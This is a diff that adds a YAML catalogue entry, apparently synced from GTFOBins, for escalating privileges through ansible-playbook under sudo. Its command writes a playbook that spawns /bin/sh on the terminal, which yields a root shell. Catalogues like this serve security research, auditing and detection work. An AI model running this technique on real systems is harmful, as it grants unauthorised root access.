@@ -1,0 +1,26 @@
+id: gtfobins/ansible-playbook/shell/sudo
+type: binary
+platform: linux
+name: ansible-playbook
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'echo ''[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]'' >/path/to/temp-file
+
+    ansible-playbook /path/to/temp-file'
+references:
+- https://gtfobins.github.io/gtfobins/ansible-playbook/
+tags:
+- linux
+- unix
+- gtfobins
